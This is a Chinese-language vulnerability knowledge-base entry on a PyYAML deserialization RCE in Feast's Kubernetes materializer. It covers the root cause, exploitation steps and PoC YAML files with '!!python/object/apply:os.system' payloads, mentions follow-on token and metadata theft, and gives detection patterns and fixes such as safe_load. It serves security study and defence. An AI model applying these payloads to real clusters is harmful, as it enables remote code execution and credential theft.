---
id: web-python-deserialization-feast-kubernetes-materializer-yaml-load-rce
title: Feast Kubernetes materializer 用 yaml.load(Loader=yaml.Loader) 解析 /var/feast 配置：可控 YAML 在 Worker Pod 执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: feast-kubernetes-materializer-yaml-load-rce
aliases:
- Feast YAML 反序列化
- Feast RCE
- feast yaml.load Loader=yaml.Loader
- Kubernetes materializer RCE
- /var/feast/feature_store.yaml
- /var/feast/materialization_config.yaml
tags:
- python
- pyyaml
- deserialization
- yaml
- feast
- kubernetes
- rce
- ai
- mlops
- config-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:37:46+08:00'
  notes: 已对照原文与 10 张截图核对：main.py 两处 yaml.load(Loader=yaml.Loader)、恶意 YAML 与 /tmp 回显、补丁改 safe_load 均一致；PoC 未独立复跑；原文未给出受影响版本区间，故不设置 versions。
---

## 一句话结论

Feast 的 Kubernetes materializer 在 Worker Pod 启动时用 `yaml.load(f, Loader=yaml.Loader)` 读取固定的 `/var/feast/feature_store.yaml` 与 `/var/feast/materialization_config.yaml`；`yaml.Loader` 是支持 `!!python/object/apply` 的不安全构造器，任何能控制这两个文件的攻击者（恶意挂载、ConfigMap/Volume 投毒、CI/CD 产物或特征仓库供应链）都能在解析阶段以 Worker Pod 权限执行任意系统命令，且命令在 `RepoConfig`/`FeatureStore` 校验之前就已执行。

## 原理

- Feast 是开源的机器学习特征存储（Feature Store），`sdk/python/feast/infra/compute_engines/kubernetes/main.py` 是 Kubernetes 引擎 materialization job 的入口。该入口在 `__main__` 中直接 `open("/var/feast/feature_store.yaml")` 和 `open("/var/feast/materialization_config.yaml")`，并分别调用 `yaml.load(f, Loader=yaml.Loader)` 与 `yaml.load(b, Loader=yaml.Loader)`。
- PyYAML 的 `yaml.Loader` 等价于 `UnsafeLoader`/`Constructor`，支持 `!!python/object/apply:func [args]` 等标签。解析 YAML 时，构造器会导入 `func` 并以列表元素为参数调用它；因此 `!!python/object/apply:os.system ["echo pwned_1 > /tmp/feast_yaml_exploit"]` 会在 `yaml.load` 返回前执行命令。
- 这两个路径是固定路径，通常由 Kubernetes 的 ConfigMap/Volume/EmptyDir 或仓库产物挂载进 Worker Pod。控制挂载内容的人（能改 ConfigMap、能写共享卷、能篡改 CI 产物、能控制特征仓库配置）即可植入恶意 YAML；不需要能访问 Feast 的 API 或 UI。
- 解析发生在 `config = RepoConfig(**feast_config)`、`store = FeatureStore(config=config)` 和 `KubernetesMaterializer(...)` 之前，因此即使恶意 YAML 缺少必需字段、后续配置校验失败，`os.system` 也已经执行；这使“配置错误”无法阻止利用。
- 两个文件是嵌套读取的：先读 `feature_store.yaml`，再读 `materialization_config.yaml`；任一文件都可以承载 payload，攻击者可根据挂载权限选择。
- 官方修复是把两处 `yaml.load(..., Loader=yaml.Loader)` 改为 `yaml.safe_load(...)`，从构造器层面禁止 Python 对象标签；这也说明根因是加载器选择而非 YAML 内容校验。

## 触发条件

- 目标 Feast 版本包含上述 Kubernetes materializer 代码（`yaml.load(..., Loader=yaml.Loader)` 读取 `/var/feast/*.yaml`）；官方已在后续版本用 `yaml.safe_load` 修复，具体受影响版本区间原文未给出明确标记。
- Kubernetes 环境中运行 Feast 的 materialization job/worker，且 `/var/feast/feature_store.yaml`、`/var/feast/materialization_config.yaml` 由攻击者可控的来源挂载（ConfigMap、PVC、共享卷、CI 产物、镜像内文件等）。
- Worker Pod 内可用 PyYAML，且进程有执行系统命令的权限（通常是 Pod 的服务账号/容器用户权限）。
- 攻击者能让 job 重新启动或触发一次 materialization（提交/更新配置、重新调度 job、等待周期任务）。

## 利用步骤

1. 准备恶意 `feature_store.yaml`：在合法 Feast 配置键之外加入 `exploit: !!python/object/apply:os.system ["echo pwned_1 > /tmp/feast_yaml_exploit"]`。
2. 准备恶意 `materialization_config.yaml`：保留 `feature_view` 与 `paths` 等键，并加入 `exploit: !!python/object/apply:os.system ["echo pwned_2 > /tmp/feast_yaml_materialization"]`。
3. 通过可控的 ConfigMap/Volume/PVC/CI 产物把两个文件放到 Worker Pod 的 `/var/feast/` 下，或替换已有挂载内容。
4. 触发 Kubernetes materialization job（`feast materialize` 使用 k8s engine、重新提交 job 或等待周期任务）；Pod 启动时 `yaml.load` 解析到 `!!python/object/apply`，执行 `os.system`。
5. 在 Pod 内验证 `/tmp/feast_yaml_exploit` 与 `/tmp/feast_yaml_materialization` 两个文件及内容，确认命令已执行；随后可替换为读取环境变量/服务账号 token、访问云元数据、横向移动等命令。
6. 清理：恢复被替换的 ConfigMap/Volume 内容，删除测试文件。

## PoC

恶意 `feature_store.yaml`（原文示例）：

```yaml
exploit: !!python/object/apply:os.system ["echo pwned_1 > /tmp/feast_yaml_exploit"]
project: demo_project
provider: local
registry:
  registry_type: file
  path: registry.db
online_store:
  type: sqlite
  path: online_store.db
offline_store:
  type: file
  path: offline_store
feature_server:
  type: local
flags: {}
```

恶意 `materialization_config.yaml`（原文示例）：

```yaml
feature_view: dummy_view
paths:
  - /tmp/nonexistent.parquet
exploit: !!python/object/apply:os.system ["echo pwned_2 > /tmp/feast_yaml_materialization"]
```

触发后检查：

```bash
cat /tmp/feast_yaml_exploit        # pwned_1
cat /tmp/feast_yaml_materialization # pwned_2
```

## 变体与关联

- 加载器变体：`yaml.load(f, Loader=yaml.UnsafeLoader)`、`yaml.unsafe_load(f)`、`yaml.load(f)`（PyYAML <5.1 默认 Constructor）同样可触发；`SafeLoader`/`safe_load` 则阻断。
- 标签变体：`!!python/object/new`、`!!python/object`、`!!python/name` 以及 `!!python/module`；在 FullLoader 受限时可用 PyYAML 构造链绕过（见关联卡）。
- 投递变体：Kubernetes ConfigMap/Secret 挂载、PVC、EmptyDir、initContainer 写入、CI/CD 构建产物、恶意特征仓库；也可在镜像构建阶段把恶意 YAML 打进镜像。
- 关联：`web-python-deser-pyyaml-tag-directive-waf-bypass-linecache`（PyYAML `%TAG` WAF 绕过）、`web-python-deserialization-pyyaml-fullconstructor-bypass-object-new`（FullLoader 下的构造链绕过）、`web-python-deserialization-mindsdb-byom-model-pickle-rce`、`web-python-deserialization-vllm-pynccl-pipe-network-pickle-rce`（其他 AI/ML 组件的反序列化入口）；Kubernetes 配置投毒可关联 `cloud/k8s` 下的供应链/ConfigMap 相关卡片。
- 边界：需要能控制 `/var/feast/*.yaml`；如果部署使用只读、签名校验或由受控 operator 生成的配置，且攻击者无法影响挂载内容，则无法触发。原文未给出明确的受影响版本区间。

## 检测与防御

- 代码修复：把所有处理外部配置的 `yaml.load` 改为 `yaml.safe_load` 或显式 `SafeLoader`；禁止 `!!python/*` 标签；对配置 schema 做白名单校验（但不要在解析前依赖 schema 拦截，因为危险标签在解析阶段就执行）。
- 供应链控制：限制谁能写 Feast 使用的 ConfigMap/PVC/共享卷与 CI 产物；对配置与镜像做签名/哈希校验；使用只读挂载（readOnly: true）并避免把可写卷挂到 `/var/feast`。
- 权限最小化：Worker Pod 使用最小权限 ServiceAccount，禁用不必要的云凭据挂载（automountServiceAccountToken=false），限制网络出口。
- 检测：审计 Kubernetes 中对 Feast 配置 ConfigMap/Volume 的写操作与 job 重建；静态扫描 `/var/feast/*.yaml` 中的 `!!python/`、`object/apply`、`os.system`、`subprocess` 等标签；监控 Worker Pod 启动后异常子进程（`sh -c`、`curl`、`cat /var/run/secrets/...`）。
- 响应：隔离受影响 Pod 与 ServiceAccount，轮换其可访问的凭据/令牌，检查 ConfigMap/PVC/镜像是否被篡改，回溯 job 的创建者与配置来源。
